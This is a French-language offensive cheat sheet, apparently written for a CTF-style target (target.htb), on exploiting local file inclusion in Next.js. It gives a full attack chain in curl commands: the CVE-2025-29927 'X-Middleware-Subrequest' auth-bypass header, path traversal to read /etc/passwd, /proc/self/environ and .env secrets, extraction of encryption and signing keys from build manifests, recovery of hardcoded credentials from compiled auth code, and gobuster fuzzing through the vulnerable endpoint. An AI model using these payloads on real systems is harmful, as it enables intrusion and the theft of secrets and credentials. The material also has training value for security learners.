# LFI sur Next.js

## <mark style="color:red;">🗂️ LFI sur Next.js — Architecture & Exploitation</mark>

> **Contexte** : Cette fiche couvre la chaîne complète d'exploitation d'une LFI dans une application Next.js, en partant de la structure interne du framework jusqu'aux fichiers sensibles accessibles.

***

### <mark style="color:blue;">1. Architecture Next.js — Ce qu'il faut connaître</mark>

#### <mark style="color:green;">Le dossier</mark> <mark style="color:green;"></mark><mark style="color:green;">`.next/`</mark> <mark style="color:green;"></mark><mark style="color:green;">(build compilé)</mark>

Quand une app Next.js est buildée (`npm run build`), tout le code est compilé dans `.next/`. Ce dossier est la **goldmine** d'une LFI.

```
/app/
├── .next/
│   ├── build-manifest.json          → Liste tous les chunks JS par page
│   ├── prerender-manifest.json      → Pages SSG/ISR + paramètres
│   ├── routes-manifest.json         → Toutes les routes (statiques, dynamiques, redirections)
│   ├── react-loadable-manifest.json → Imports dynamiques
│   └── server/
│       ├── pages-manifest.json      → URL → fichier JS/HTML compilé
│       ├── middleware-manifest.json → Config du middleware (matchers, env vars !)
│       ├── middleware.js             → Code compilé du middleware
│       └── pages/
│           └── api/
│               └── [...nextauth].js → Code auth compilé (credentials en clair !)
├── .env                              → Variables d'environnement
└── next.config.mjs                  → Config Next.js
```

#### <mark style="color:green;">Fichiers prioritaires à exfiltrer</mark>

| Fichier                           | Ce qu'on y trouve                                                 |
| --------------------------------- | ----------------------------------------------------------------- |
| `.env`                            | `NEXTAUTH_SECRET`, clés API, secrets                              |
| `middleware-manifest.json`        | `NEXT_SERVER_ACTIONS_ENCRYPTION_KEY`, preview mode keys, build ID |
| `pages-manifest.json`             | Carte complète URL → fichier compilé                              |
| `routes-manifest.json`            | Toutes les routes, redirections, rewrites                         |
| `pages/api/auth/[...nextauth].js` | **Credentials en clair** dans le code compilé                     |
| `/proc/self/environ`              | Variables d'environnement du processus Node                       |

***

### <mark style="color:blue;">2. Identifier une LFI dans une API Next.js</mark>

#### <mark style="color:green;">Signature typique</mark>

Un endpoint `/api/download` ou `/api/file` avec un paramètre de chemin :

```http
GET /api/download?example=hello-world.ts HTTP/1.1
Host: target.htb
```

#### <mark style="color:green;">Test basique</mark>

```bash
curl "http://target.htb/api/download?example=../../../etc/passwd"
```

#### <mark style="color:green;">Pourquoi</mark> <mark style="color:green;"></mark><mark style="color:green;">`../../../`</mark> <mark style="color:green;"></mark><mark style="color:green;">?</mark>

L'app tourne dans `/app/` (ou `/home/nextjs/`). Pour remonter à la racine :

```
/app/public/examples/  →  ../  =  /app/public/
                           ../../  =  /app/
                           ../../../  =  /
```

***

### <mark style="color:blue;">3. Chaîne d'exploitation complète</mark>

#### <mark style="color:green;">Étape 1 — Bypass auth (si présent)</mark>

Si l'endpoint est protégé par un middleware Next.js vulnérable à CVE-2025-29927 :

```bash
curl -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" \
     "http://target.htb/api/download?example=../../../etc/passwd"
```

#### <mark style="color:green;">Étape 2 — Enum de l'environnement</mark>

```bash
# Variables d'env du process Node
curl [BYPASS_HEADER] "http://target.htb/api/download?example=../../../proc/self/environ"

# Infos utiles : HOME, PWD, PORT, NODE_ENV, PATH
# PWD=/app → chemin de l'application
# HOME=/home/nextjs → utilisateur
```

#### <mark style="color:green;">Étape 3 — Lire les secrets</mark>

```bash
# .env à la racine de l'app
curl [BYPASS_HEADER] "http://target.htb/api/download?example=../../.env"
# → NEXTAUTH_SECRET=...
# → DATABASE_URL=...
# → ADMIN_SECRET=...
```

#### <mark style="color:green;">Étape 4 — Cartographier l'app avec les manifests</mark>

```bash
# Toutes les routes
curl [BYPASS_HEADER] "http://target.htb/api/download?example=../../.next/routes-manifest.json"

# Toutes les pages et leurs fichiers JS compilés
curl [BYPASS_HEADER] "http://target.htb/api/download?example=../../.next/server/pages-manifest.json"
```

**Output de `pages-manifest.json` :**

```json
{
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
  "/api/download": "pages/api/download.js",
  "/docs": "pages/docs.html"
}
```

#### <mark style="color:green;">Étape 5 — Lire le code compilé (credentials)</mark>

```bash
curl [BYPASS_HEADER] \
  "http://target.htb/api/download?example=../../.next/server/pages/api/auth/[...nextauth].js"
```

Dans le JS compilé, chercher :

```javascript
authorize: async (e) =>
  e?.username === "jeremy" &&
  e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
```

> ⚠️ **Next.js compile les credentials directement dans le JS** si `process.env.VARIABLE ?? "fallback"` est utilisé. Le fallback est toujours en clair.

#### <mark style="color:green;">Étape 6 — Clés du middleware</mark>

```bash
curl [BYPASS_HEADER] "http://target.htb/api/download?example=../../.next/server/middleware-manifest.json"
```

Contient :

```json
"env": {
  "__NEXT_BUILD_ID": "...",
  "NEXT_SERVER_ACTIONS_ENCRYPTION_KEY": "...",
  "__NEXT_PREVIEW_MODE_SIGNING_KEY": "..."
}
```

***

### <mark style="color:blue;">4. Fuzzing avec une LFI</mark>

#### <mark style="color:green;">Gobuster sur l'endpoint vulnérable</mark>

```bash
# Trouver les dossiers dans .next/
gobuster dir \
  -u "http://target.htb/api/download?example=../../.next/" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
```

#### <mark style="color:green;">Chemin typique de recherche</mark>

```
.next/          → server/, static/
.next/server/   → pages/
.next/server/pages/ → api/, docs/, ...
```

***

### <mark style="color:blue;">5. Résumé des chemins utiles</mark>

```bash
# Système
../../../etc/passwd
../../../proc/self/environ

# App Next.js (depuis /app/public/examples/ ou similaire)
../../.env
../../next.config.mjs

# Build Next.js
../../.next/build-manifest.json
../../.next/routes-manifest.json
../../.next/prerender-manifest.json
../../.next/server/pages-manifest.json
../../.next/server/middleware-manifest.json
../../.next/server/middleware.js
../../.next/server/pages/api/auth/[...nextauth].js
../../.next/server/pages/api/[ENDPOINT].js
```

***

###
